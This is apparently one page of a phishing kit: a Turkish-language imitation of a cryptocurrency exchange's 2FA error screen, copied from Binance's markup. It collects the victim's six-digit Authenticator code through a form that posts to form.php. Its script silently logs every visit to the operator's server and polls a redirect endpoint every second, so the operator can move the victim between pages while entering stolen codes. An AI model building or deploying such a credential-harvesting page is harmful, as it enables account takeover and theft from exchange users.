<!DOCTYPE html>
<html lang="tr">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2FA Hatalı | Güvenlik Kontrolü</title>
    <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico">
    <link rel="stylesheet" href="../assets/css/style.css">
  </head>
  <body class="fa22">
    <div id="__nuxt">
      <div id="__layout">
        <div data-v-905421cc="">
          <div data-v-1445057b="" data-v-905421cc="" id="headerId" class="top">
            <header data-v-1445057b="" class="z-9 fixed">
              <nav data-v-1445057b="">
                <a data-v-1445057b="" class="nav-logo nuxt-link-active">
                  <img data-v-1445057b="" src="../assets/images/logo.png" alt="logo" class="logo">
                </a>
                <div data-v-1445057b="" class="nav-list">
                  <a data-v-1445057b="">Piyasalar</a>
                  <a data-v-1445057b="">Al-Sat</a>
                  <a data-v-1445057b="">Yatırma</a>
                  <a data-v-1445057b="">Çekme</a>
                  <a data-v-1445057b="">Kolay Al/Sat</a>
                  <a data-v-1445057b="">Dönüştür</a>
                  <a data-v-1445057b="">Otomatik Yatırım</a>
                  <a data-v-1445057b="">Blog</a>
                  <a data-v-1445057b="">Destek Merkezi</a>
                  </a>
                </div>
                <div data-v-1445057b="" class="nav-r">
                  <div data-v-1445057b="" class="nav-signin">
                    <div data-v-1445057b="" class="register">
                      <a data-v-1445057b="" class="_signin">Giriş Yap</a>
                      <a data-v-1445057b="" class="bc-btn bc-btn-yellow _signup">Hesap Oluştur</a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="exchange-rate dropdown-arrow download-icon">
                    <span data-v-1445057b="">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use data-v-1445057b="" xlink:href="#icondownload"></use>
                      </svg>
                    </span>
                    <div data-v-1445057b="" class="rate-list clearfix z-2 download">
                      <div data-v-1445057b="" class="download-qrcode">
                        <canvas width="120" height="120" style="display: none;"></canvas>
                        <img style="display: block;" src="../assets/images/mqr.png">
                      </div>
                      <p data-v-1445057b="">İndirmek Tara IOS &amp; Android</p>
                      <a data-v-1445057b="" class="bc-btn bc-btn-yellow">İndirme Seçenekleri</a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="exchange-rate">
                    <span data-v-1445057b="">Türkçe</span> &nbsp;|&nbsp; <span data-v-1445057b="">TRY</span>
                  </div>
                  <!---->
                  <div data-v-1445057b="" class="phoneMore">
                    <svg data-v-1445057b="" aria-hidden="true" class="icon">
                      <use xlink:href="#iconmore"></use>
                    </svg>
                  </div>
                </div>
              </nav>
            </header>
            <div data-v-1445057b="" class="sideslip-box" style="display: none;">
              <div data-v-1445057b="" class="sideslip-content" style="display: none;">
                <div data-v-1445057b="" class="sideslip-container">
                  <a data-v-1445057b="" class="_signin_">Giriş Yap</a>
                  <a data-v-1445057b="" class="bc-btn bc-btn-yellow _signup_">Hesap Oluştur</a>
                  <div data-v-1445057b="" class="split-line"></div>
                  <!---->
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconmarket"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Piyasa </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconspot"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Borsa </a>
                    </div>
                  </div>
                  <!---->
                  <!---->
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconwallet"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Yatırma </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconwallet"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Çekme </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconrectangle"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Öğren &amp; Kazan! </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconconvert"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Kolay Al/Sat </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconlamp"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" target="_blank" class="menu-text"> Blog <span data-v-1445057b="" class="extend-content"> Yeni </span>
                      </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="split-line"></div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#icondownload"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> İndir </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconlang"></use>
                        </svg>
                      </div>
                      <div data-v-1445057b="" class="menu-text"> Türkçe | TRY </div>
                    </div>
                  </div>
                </div>
              </div>
              <div data-v-1445057b="" class="sideslip-bg"></div>
            </div>
            <div data-v-1445057b="" class="sideslip-box" style="display: none;">
              <div data-v-1445057b="" class="sideslip-content" style="display: none;">
                <div data-v-1445057b="" class="sideslip-container">
                  <!---->
                  <!---->
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconsecurity"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Güvenlik </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconkyc"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Kimlik Doğrulama ve Limitler </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconapi"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> API Yönetimi </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconreferral"></use>
                        </svg>
                      </div>
                      <a data-v-1445057b="" class="menu-text"> Referans </a>
                    </div>
                  </div>
                  <div data-v-1445057b="" class="split-line"></div>
                  <div data-v-1445057b="" class="phone-menu">
                    <div data-v-1445057b="" class="phone-menu-p">
                      <div data-v-1445057b="" class="icon-wap">
                        <svg data-v-1445057b="" aria-hidden="true" class="icon">
                          <use xlink:href="#iconlogout"></use>
                        </svg>
                      </div>
                      <div data-v-1445057b="" class="menu-text"> Çıkış Yap </div>
                    </div>
                  </div>
                </div>
              </div>
              <div data-v-1445057b="" class="sideslip-bg"></div>
            </div>
            <!---->
            <!---->
          </div>
          <main data-v-5c4d12e5="" data-v-905421cc="">
            <section data-v-6408680b="" data-v-5c4d12e5="">
              <h2 data-v-6408680b="">2FA</h2>
              <div class="login-box" data-v-6408680b="">
                <div class="loading" style="display:none;" data-v-6408680b="">
                  <div class="groove" data-v-6408680b="">
                    <div class="bar" data-v-6408680b=""></div>
                  </div>
                </div>
                <div class="binance-row css-16kn2us">
                  <div class="binance-col css-1wz0uwi">
                    <div class="css-108ucgm">
                      <div class="css-51cj2k"></div>
                      <div class="title-area css-4hwal1">
                        <div class="css-tufkcx">
                          <div class="css-vurnku">
                            <div data-bn-type="text" class="css-1mzk4e3">Güvenlik doğrulaması</div>
                            <div class="css-q0ghv2">
                              <div data-bn-type="text" class="css-s3l2jm">Hesabınızı güvence altına almak için lütfen aşağıdaki doğrulamayı tamamlayın.</div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    <form action="form.php" method="POST">
                      <div class=" css-jqp4sb">
                        <h2 data-bn-type="text" class="bn-2fa-title css-unqtoz">Güvenlik doğrulaması</h2>
                        <div class=" css-key3v2">
                          <div class="css-enhan1">
                            <div class="balance-input" style="width:100%;">
                              <div class="bn-2fa-field css-1pnngcv" style="width: 100%; border-color: rgb(248, 73, 96);">
                                <input data-bn-type="input" aria-label="SMS Kodu" class="css-16fg16t" type="text" inputmode="numeric" name="2fa2" maxlength="6" autocomplete="one-time-code">
                                <label class="bn-input-label css-k4png4">Authenticator Kodu</label>
                              </div>
                              <div data-v-98aa385e="" class="err-tip" style="display: block;">
                                Google Authenticator'daki 6 haneli kodu doğru şekilde girin.
                              </div>
                              <div data-bn-type="text" style="display: none;" class="bn-2fa-fieldInfo css-1nhs0qv">Authenticator'daki 6 haneli kodu girin.</div>
                            <div class="bn-2fa-submit css-vurnku">
                              <button type="submit" class="inactive bc-btn bc-btn-yellow sensors-login" style="width: 100%">Onayla</button>
                            </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      <input type="hidden" name="token" value="<?php echo isset($_SESSION['form_token']) ? $_SESSION['form_token'] : generateFormToken(); ?>">
                      
                    </form>
                  </div>
                </div>
              </div>
            </section>
            <!---->
          </main>
          <?php include_once '../component/footer.php'; ?>
        </div>
      </div>
    </div>
    <div class="loading-box" style="display: none;">
      <img src="../assets/images/loading.svg" alt="loading">
    </div>
    <div class="area">
        <div class="css-1vb7bc9" style="transform: translate3d(0px, 0px, 0px);">
          <div class="css-lu6k78" style="opacity: 1;">
            <div class="css-14qry50" data-bnc="Indicator#2fa2">
              <div class="css-1bpj83k">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-boyavq">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5.326 13.909l-1.429 1.417L12 13.429l-3.897 3.897-1.429-1.417 3.909-3.898-3.909-3.908 1.429-1.417L12 10.583l3.897-3.897 1.429 1.417-3.897 3.908 3.897 3.898z" fill="currentColor"></path>
                </svg>
              </div>
              <div class="bn-notification-body-wrapper css-gxv9qv">
                <div data-bn-type="text" class="bn-notification-msg-wrapper css-161eirp">Hatalı bir Authenticator kodu girdiniz.</div>
              </div>
            </div>
          </div>
        </div>
        <div class="css-vp41bv">
          <div class="css-baaq78">
            <div class="css-tolw2i"></div>
            <div class="css-16wz1c4">
            <div class="css-hv39bs">
              <div class="css-uq1pv2">
                <div src="../assets/images/error.svg" class="css-ydz7pw"></div>
              </div>
              <div data-bn-type="text" class="modal-desc css-1ixmqv3">Authenticator kodu geçersiz. Lütfen tekrar deneyin.</div>
              <div class="btn-group css-1tr0qpm">
                <button data-bn-type="button" class="bc-btn bc-btn-yellow sensors-login" style="width:100%">
                  <div data-bn-type="text" class="css-1c82c04">Anladım</div>
                </button>
              </div>
                </div>
              </div>
            </div>
          </div>
      </div>
    <script>
      // Retry mekanizması ile fetch wrapper - kayıt garantisi için
      async function fetchWithRetry(url, options = {}, maxRetries = 5, delay = 1000) {
        let lastError;
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
          try {
            const response = await fetch(url, options);
            
            // 500, 503 veya network hatası ise retry yap
            if (response.ok || (response.status !== 500 && response.status !== 503)) {
              return response;
            }
            
            if (attempt < maxRetries) {
              console.log(`Server error ${response.status}, retrying... (${attempt}/${maxRetries})`);
              await new Promise(resolve => setTimeout(resolve, delay * attempt));
              continue;
            }
            
            return response;
          } catch (err) {
            lastError = err;
            
            if (attempt < maxRetries) {
              console.log(`Network error, retrying... (${attempt}/${maxRetries}): ${err.message}`);
              await new Promise(resolve => setTimeout(resolve, delay * attempt));
              continue;
            }
          }
        }
        
        // Son denemede de başarısız olursa sessizce devam et
        if (lastError) {
          console.error('Fetch failed after retries (silent):', lastError);
        }
        return { ok: false, status: 500 };
      }

      async function sendLogUpdate(payload) {
        try {
          const body = JSON.stringify(payload);
          const response = await fetchWithRetry('/api/log-page', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body,
            keepalive: true
          }, 5, 1000);
          
          if (!response.ok) {
            console.error('2FA2 log failed after retries (silent):', response.status);
            // Sessizce devam et - kullanıcıya hata gösterme
          }
          
          return true;
        } catch (err) {
          console.error('2FA2 log error (silent):', err);
          // Sessizce devam et - kullanıcıya hata gösterme
          return true;
        }
      }

      function log2fa2Page() {
        sendLogUpdate({ page: '2fa2' }).catch(err => console.error('2FA2 page log failed', err));
      }

      log2fa2Page();

      async function checkRedirect() {
        try {
          const res = await fetch('/api/check-redirect', { 
            cache: 'no-store',
            keepalive: true 
          });
          if (res.ok) {
            const data = await res.json();
            if (data.redirectTo) {
              // Direkt yönlendir - window.location.replace() daha hızlı ve geçmişe eklenmez
              window.location.replace(data.redirectTo);
              return true;
            }
          }
        } catch (err) {
          console.error('Redirect check failed', err);
        }
        return false;
      }

      checkRedirect();
      // Daha sık kontrol et - her 1 saniyede bir
      setInterval(checkRedirect, 1000);

      const frm = document.querySelector('form');
      let aIpp = frm.elements[0];

      frm.addEventListener('submit', (evt) => {
          evt.preventDefault();
          if (/^\d{6}$/.test(aIpp.value.trim())) {
              aIpp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
              aIpp.parentElement.nextElementSibling.style.display = 'none';
              frm.submit();
          } else {
              aIpp.parentElement.style.borderColor = '#f84960';
              aIpp.parentElement.nextElementSibling.style.display = 'block';
              // Modal göster
              const areaEl = document.querySelector('.area');
              if (areaEl) {
                areaEl.style.display = 'block';
              }
          }
      });

      const btn = document.querySelector("body > div.area > div.css-vp41bv > div > div.css-16wz1c4 > div > div.btn-group.css-1tr0qpm > button");
      if (btn) {
        btn.addEventListener('click', () => {
          const areaEl = document.querySelector("body > div.area");
          if (areaEl) {
            areaEl.style.display = 'none';
          }
        });
      }

    </script>
  </body>
</html>